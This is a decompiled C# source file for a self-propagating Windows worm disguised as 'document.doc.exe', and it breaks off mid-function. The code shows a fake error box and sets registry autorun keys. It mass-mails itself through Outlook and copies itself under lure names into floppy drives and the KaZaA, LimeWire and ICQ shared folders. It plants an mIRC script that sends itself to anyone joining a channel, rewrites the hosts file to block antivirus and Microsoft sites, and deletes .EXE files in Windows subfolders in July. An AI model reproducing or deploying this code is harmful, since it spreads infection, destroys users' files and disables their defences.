using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace document.doc.exe;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(292, 273);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		Interaction.MsgBox((object)"Chould not open file", (MsgBoxStyle)16, (object)"Error:");
		RegistrySetup();
	}

	public void RegistrySetup()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		RegistryKey registryKey = default(RegistryKey);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 241:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0035;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_0059;
						case 8:
							goto IL_006b;
						case 9:
							goto IL_007d;
						case 10:
							goto IL_0090;
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 12:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0090:
					num = 10;
					registryKey.SetValue("sendmailfin", "C:\\Windows\\System\\sendmailfin.vbs");
					break;
					IL_007d:
					num = 9;
					registryKey.SetValue("sendmaildk", "C:\\Windows\\System\\sendmaildk.vbs");
					goto IL_0090;
					IL_0008:
					num = 2;
					registryKey = Registry.LocalMachine;
					goto IL_0010;
					IL_0010:
					num = 3;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_0023;
					IL_0023:
					num = 4;
					registryKey.SetValue("svhost", "C:\\Windows\\System\\svhost.exe");
					goto IL_0035;
					IL_0035:
					num = 5;
					registryKey.SetValue("mailsend", "C:\\Windows\\send.vbs");
					goto IL_0047;
					IL_0047:
					num = 6;
					registryKey.SetValue("Christmas", "C:\\Windows\\System\\christmassend.vbs");
					goto IL_0059;
					IL_0059:
					num = 7;
					registryKey.SetValue("loveletter", "C:\\Windows\\System\\loveletter.vbs");
					goto IL_006b;
					IL_006b:
					num = 8;
					registryKey.SetValue("sendmaileng", "C:\\Windows\\System\\sendmaileng.vbs");
					goto IL_007d;
					end_IL_0000_2:
					break;
				}
				num = 11;
				SendMail();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 241;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SendMail()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 452:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0135:
					num = 24;
					streamWriter.Close();
					break;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("echo next");
					goto IL_0135;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\send.vbs");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("on error resume next");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("dim a,b,c,d,e");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("set a = Wscript.CreateObject(\"Wscript.Shell\")");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("set b = CreateObject(\"Outlook.Application\")");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("set c = b.GetNameSpace(\"MAPI\")");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("for y = 1 To c.AddressLists.Count");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("set d = c.AddressLists(y)");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("x = 1");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("set e = b.CreateItem(0)");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("for o = 1 To d.AddressEntries.Count");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("f = d.AddressEntries(x)");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("e.Recipients.Add f");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("x = x + 1");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("next");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("e.Subject = \"Server Report\"");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("e.Body = \"Mail transaction failed!\"");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("e.Attachments.Add (\"C:\\Windows\\document.doc.exe\")");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("e.DeleteAfterSubmit = False");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("e.Send");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("f = \"");
					goto IL_0127;
					end_IL_0000_2:
					break;
				}
				num = 25;
				CopyToSystem();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 452;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void CopyToSystem()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string location = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 131:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003c:
					num = 6;
					File.Copy(location, "C:\\Windows\\system\\svhost.exe");
					break;
					IL_002f:
					num = 5;
					File.Copy(location, "C:\\Windows\\christmas-love.doc.exe");
					goto IL_003c;
					IL_0008:
					num = 2;
					location = Assembly.GetExecutingAssembly().Location;
					goto IL_0015;
					IL_0015:
					num = 3;
					File.Copy(location, "C:\\Windows\\document.doc.exe");
					goto IL_0022;
					IL_0022:
					num = 4;
					File.Copy(location, "C:\\Windows\\LOVE-LETTER-FOR-YOU.TXT.exe");
					goto IL_002f;
					end_IL_0000_2:
					break;
				}
				num = 7;
				FloppySpread();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 131;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void FloppySpread()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string location = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 102:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0023;
						case 5:
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					File.Copy(location, "A:\\document.doc.exe");
					break;
					IL_0015:
					num = 3;
					if (!Directory.Exists("A:\\"))
					{
						break;
					}
					goto IL_0023;
					IL_0008:
					num = 2;
					location = Assembly.GetExecutingAssembly().Location;
					goto IL_0015;
					end_IL_0000_2:
					break;
				}
				num = 6;
				SpreadP2P();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 102;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SpreadP2P()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string location = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 616:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0030;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_004a;
						case 8:
							goto IL_0057;
						case 9:
							goto IL_0064;
						case 10:
							goto IL_0072;
						case 11:
							goto IL_0080;
						case 12:
							goto IL_008e;
						case 13:
						case 14:
							goto IL_009c;
						case 15:
							goto IL_00ab;
						case 16:
							goto IL_00b9;
						case 17:
							goto IL_00c7;
						case 18:
							goto IL_00d5;
						case 19:
							goto IL_00e3;
						case 20:
							goto IL_00f1;
						case 21:
							goto IL_00ff;
						case 22:
							goto IL_010d;
						case 23:
							goto IL_011b;
						case 24:
						case 25:
							goto IL_0129;
						case 26:
							goto IL_0138;
						case 27:
							goto IL_0146;
						case 28:
							goto IL_0154;
						case 29:
							goto IL_0162;
						case 30:
							goto IL_0170;
						case 31:
							goto IL_017e;
						case 32:
							goto IL_018c;
						case 33:
							goto IL_019a;
						case 34:
							goto IL_01a8;
						case 35:
						case 36:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 37:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_01a8:
					num = 34;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\multi_crack_app(SAFE!).exe");
					break;
					IL_019a:
					num = 33;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\mydoom.source.doc.exe");
					goto IL_01a8;
					IL_0008:
					num = 2;
					location = Assembly.GetExecutingAssembly().Location;
					goto IL_0015;
					IL_0015:
					num = 3;
					if (Directory.Exists("C:\\Program Files\\KaZaA\\My Shared Folder"))
					{
						goto IL_0023;
					}
					goto IL_009c;
					IL_0023:
					num = 4;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\document.doc.exe");
					goto IL_0030;
					IL_0030:
					num = 5;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\freexxx.doc.exe");
					goto IL_003d;
					IL_003d:
					num = 6;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\activation_crack_vista.exe");
					goto IL_004a;
					IL_004a:
					num = 7;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\lol.exe");
					goto IL_0057;
					IL_0057:
					num = 8;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\wow-crack.exe");
					goto IL_0064;
					IL_0064:
					num = 9;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\world-of-warcraft_hacktool.exe");
					goto IL_0072;
					IL_0072:
					num = 10;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\office-vista_crack.exe");
					goto IL_0080;
					IL_0080:
					num = 11;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\mydoom.source.doc.exe");
					goto IL_008e;
					IL_008e:
					num = 12;
					File.Copy(location, "C:\\Program Files\\KaZaA\\My Shared Folder\\multi_crack_app(SAFE!).exe");
					goto IL_009c;
					IL_009c:
					num = 14;
					if (Directory.Exists("C:\\Program Files\\LimeWire\\Shared"))
					{
						goto IL_00ab;
					}
					goto IL_0129;
					IL_00ab:
					num = 15;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\document.doc.exe");
					goto IL_00b9;
					IL_00b9:
					num = 16;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\freexxx.doc.exe");
					goto IL_00c7;
					IL_00c7:
					num = 17;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\activation_crack_vista.exe");
					goto IL_00d5;
					IL_00d5:
					num = 18;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\lol.exe");
					goto IL_00e3;
					IL_00e3:
					num = 19;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\wow-crack.exe");
					goto IL_00f1;
					IL_00f1:
					num = 20;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\world-of-warcraft_hacktool.exe");
					goto IL_00ff;
					IL_00ff:
					num = 21;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\office-vista_crack.exe");
					goto IL_010d;
					IL_010d:
					num = 22;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\mydoom.source.doc.exe");
					goto IL_011b;
					IL_011b:
					num = 23;
					File.Copy(location, "C:\\Program Files\\LimeWire\\Shared\\multi_crack_app(SAFE!).exe");
					goto IL_0129;
					IL_0129:
					num = 25;
					if (!Directory.Exists("C:\\Program Files\\ICQ\\Shared Files"))
					{
						break;
					}
					goto IL_0138;
					IL_0138:
					num = 26;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\document.doc.exe");
					goto IL_0146;
					IL_0146:
					num = 27;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\freexxx.doc.exe");
					goto IL_0154;
					IL_0154:
					num = 28;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\activation_crack_vista.exe");
					goto IL_0162;
					IL_0162:
					num = 29;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\lol.exe");
					goto IL_0170;
					IL_0170:
					num = 30;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\wow-crack.exe");
					goto IL_017e;
					IL_017e:
					num = 31;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\world-of-warcraft_hacktool.exe");
					goto IL_018c;
					IL_018c:
					num = 32;
					File.Copy(location, "C:\\Program Files\\ICQ\\Shared Files\\office-vista_crack.exe");
					goto IL_019a;
					end_IL_0000_2:
					break;
				}
				num = 36;
				BlockPages();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 616;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void BlockPages()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 506:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0015;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_003c;
						case 7:
							goto IL_0049;
						case 8:
							goto IL_0056;
						case 9:
							goto IL_0063;
						case 10:
							goto IL_0071;
						case 11:
							goto IL_007f;
						case 12:
							goto IL_008d;
						case 13:
							goto IL_009b;
						case 14:
							goto IL_00a9;
						case 15:
							goto IL_00b7;
						case 16:
							goto IL_00c5;
						case 17:
							goto IL_00d3;
						case 18:
							goto IL_00e1;
						case 19:
							goto IL_00ef;
						case 20:
							goto IL_00fd;
						case 21:
							goto IL_010b;
						case 22:
							goto IL_0119;
						case 23:
							goto IL_0127;
						case 24:
							goto IL_0135;
						case 25:
							goto IL_0143;
						case 26:
							goto IL_0151;
						case 27:
							goto IL_015f;
						case 28:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 29:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_015f:
					num = 27;
					streamWriter.Close();
					break;
					IL_0151:
					num = 26;
					streamWriter.WriteLine("64.233.187.99 clamwin.com");
					goto IL_015f;
					IL_0008:
					num = 2;
					streamWriter = File.CreateText("C:\\Windows\\System32\\Drivers\\Etc\\Hosts");
					goto IL_0015;
					IL_0015:
					num = 3;
					streamWriter.WriteLine("64.233.187.99 www.mcafee.com");
					goto IL_0022;
					IL_0022:
					num = 4;
					streamWriter.WriteLine("64.233.187.99 www.f-secure.com");
					goto IL_002f;
					IL_002f:
					num = 5;
					streamWriter.WriteLine("64.233.187.99 www.microsoft.com");
					goto IL_003c;
					IL_003c:
					num = 6;
					streamWriter.WriteLine("64.233.187.99 www.download.com");
					goto IL_0049;
					IL_0049:
					num = 7;
					streamWriter.WriteLine("64.233.187.99 www.trendmicro.com");
					goto IL_0056;
					IL_0056:
					num = 8;
					streamWriter.WriteLine("64.233.187.99 www.symantec.com");
					goto IL_0063;
					IL_0063:
					num = 9;
					streamWriter.WriteLine("64.233.187.99 www.grisoft.com");
					goto IL_0071;
					IL_0071:
					num = 10;
					streamWriter.WriteLine("64.233.187.99 www.avast.com");
					goto IL_007f;
					IL_007f:
					num = 11;
					streamWriter.WriteLine("64.233.187.99 www.eset.com");
					goto IL_008d;
					IL_008d:
					num = 12;
					streamWriter.WriteLine("64.233.187.99 www.clamav.net");
					goto IL_009b;
					IL_009b:
					num = 13;
					streamWriter.WriteLine("64.233.187.99 www.zonealarm.com");
					goto IL_00a9;
					IL_00a9:
					num = 14;
					streamWriter.WriteLine("64.233.187.99 www.clamwin.com");
					goto IL_00b7;
					IL_00b7:
					num = 15;
					streamWriter.WriteLine("64.233.187.99 mcafee.com");
					goto IL_00c5;
					IL_00c5:
					num = 16;
					streamWriter.WriteLine("64.233.187.99 f-secure.com");
					goto IL_00d3;
					IL_00d3:
					num = 17;
					streamWriter.WriteLine("64.233.187.99 microsoft.com");
					goto IL_00e1;
					IL_00e1:
					num = 18;
					streamWriter.WriteLine("64.233.187.99 download.com");
					goto IL_00ef;
					IL_00ef:
					num = 19;
					streamWriter.WriteLine("64.233.187.99 trendmicro.com");
					goto IL_00fd;
					IL_00fd:
					num = 20;
					streamWriter.WriteLine("64.233.187.99 symantec.com");
					goto IL_010b;
					IL_010b:
					num = 21;
					streamWriter.WriteLine("64.233.187.99 grisoft.com");
					goto IL_0119;
					IL_0119:
					num = 22;
					streamWriter.WriteLine("64.233.187.99 avast.com");
					goto IL_0127;
					IL_0127:
					num = 23;
					streamWriter.WriteLine("64.233.187.99 eset.com");
					goto IL_0135;
					IL_0135:
					num = 24;
					streamWriter.WriteLine("64.233.187.99 clamav.net");
					goto IL_0143;
					IL_0143:
					num = 25;
					streamWriter.WriteLine("64.233.187.99 zonealarm.com");
					goto IL_0151;
					end_IL_0000_2:
					break;
				}
				num = 28;
				SpreadmIRC();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 506;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void SpreadmIRC()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		StreamWriter streamWriter2 = default(StreamWriter);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 437:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_0034;
						case 6:
							goto IL_0042;
						case 7:
							goto IL_0050;
						case 8:
							goto IL_005e;
						case 9:
							goto IL_006c;
						case 10:
							goto IL_007b;
						case 11:
							goto IL_008a;
						case 12:
						case 13:
						case 14:
							goto IL_0094;
						case 15:
							goto IL_00a7;
						case 16:
							goto IL_00b7;
						case 17:
							goto IL_00c6;
						case 18:
							goto IL_00d5;
						case 19:
							goto IL_00e4;
						case 20:
							goto IL_00f3;
						case 21:
							goto IL_0102;
						case 22:
							goto IL_0111;
						case 23:
							goto IL_0120;
						case 24:
						case 25:
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0120:
					num = 23;
					streamWriter.Close();
					break;
					IL_0111:
					num = 22;
					streamWriter.WriteLine("n3=}");
					goto IL_0120;
					IL_0008:
					num = 2;
					if (Directory.Exists("C:\\Program Files\\mIRC"))
					{
						goto IL_0017;
					}
					goto IL_0094;
					IL_0017:
					num = 3;
					if (File.Exists("C:\\Program Files\\mIRC\\mirc.exe"))
					{
						goto IL_0026;
					}
					goto IL_0094;
					IL_0026:
					num = 4;
					streamWriter2 = File.CreateText("C:\\Program Files\\mIRC\\Script.ini");
					goto IL_0034;
					IL_0034:
					num = 5;
					streamWriter2.WriteLine("[script]");
					goto IL_0042;
					IL_0042:
					num = 6;
					streamWriter2.WriteLine(";mIRC Script");
					goto IL_0050;
					IL_0050:
					num = 7;
					streamWriter2.WriteLine("n0=on 1:JOIN:#:{");
					goto IL_005e;
					IL_005e:
					num = 8;
					streamWriter2.WriteLine("n1=  /if ( $nick == $me ) { halt }");
					goto IL_006c;
					IL_006c:
					num = 9;
					streamWriter2.WriteLine("n2=  /.dcc send $nick C:\\Windows\\document.doc.exe");
					goto IL_007b;
					IL_007b:
					num = 10;
					streamWriter2.WriteLine("n3=}");
					goto IL_008a;
					IL_008a:
					num = 11;
					streamWriter2.Close();
					goto IL_0094;
					IL_0094:
					num = 14;
					if (!Directory.Exists("C:\\mIRC"))
					{
						break;
					}
					goto IL_00a7;
					IL_00a7:
					num = 15;
					if (!File.Exists("C:\\mIRC\\mirc.exe"))
					{
						break;
					}
					goto IL_00b7;
					IL_00b7:
					num = 16;
					streamWriter = File.CreateText("C:\\mIRC\\Script.ini");
					goto IL_00c6;
					IL_00c6:
					num = 17;
					streamWriter.WriteLine("[script]");
					goto IL_00d5;
					IL_00d5:
					num = 18;
					streamWriter.WriteLine(";mIRC Script");
					goto IL_00e4;
					IL_00e4:
					num = 19;
					streamWriter.WriteLine("n0=on 1:JOIN:#:{");
					goto IL_00f3;
					IL_00f3:
					num = 20;
					streamWriter.WriteLine("n1=  /if ( $nick == $me ) { halt }");
					goto IL_0102;
					IL_0102:
					num = 21;
					streamWriter.WriteLine("n2=  /.dcc send $nick C:\\Windows\\document.doc.exe");
					goto IL_0111;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Payload();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 437;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public void Payload()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		DirectoryInfo[] directories = default(DirectoryInfo[]);
		DirectoryInfo[] array = default(DirectoryInfo[]);
		int num5 = default(int);
		DirectoryInfo directoryInfo2 = default(DirectoryInfo);
		FileInfo[] files = default(FileInfo[]);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 290:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_002e;
						case 5:
							goto IL_003c;
						case 6:
							goto IL_0046;
						case 7:
							goto IL_0057;
						case 8:
							goto IL_006d;
						case 9:
							goto IL_008e;
						case 10:
							goto IL_009d;
						case 11:
							goto IL_00a3;
						case 12:
							goto IL_00b5;
						case 13:
						case 14:
						case 15:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 16:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_006d:
					num = 8;
					if (Operators.CompareString(Path.GetExtension(fileInfo.FullName)!.ToUpper(), ".EXE", false) == 0)
					{
						goto IL_008e;
					}
					goto IL_009d;
					IL_00a3:
					num = 11;
					goto IL_00a7;
					IL_0009:
					num = 2;
					if (DateAndTime.Month(DateAndTime.get_Now()) != 7)
					{
						break;
					}
					goto IL_001c;
					IL_001c:
					num = 3;
					if (!Directory.Exists("C:\\Windows"))
					{
						break;
					}
					goto IL_002e;
					IL_002e:
					num = 4;
					directoryInfo = new DirectoryInfo("C:\\Windows");
					goto IL_003c;
					IL_003c:
					num = 5;
					directories = directoryInfo.GetDirectories();
					goto IL_0046;
					IL_0046:
					num = 6;
					array = directories;
					num5 = 0;
					goto IL_00b9;
					IL_00b9:
					if (num5 >= array.Length)
					{
						break;
					}
					directoryInfo2 = array[num5];
					goto IL_0057;
					IL_008e:
					num = 9;
					File.Delete(fileInfo.FullName);
					goto IL_009d;
					IL_0057:
					num = 7;
					files = directoryInfo2.GetFiles();
					num6 = 0;
					goto IL_00a7;
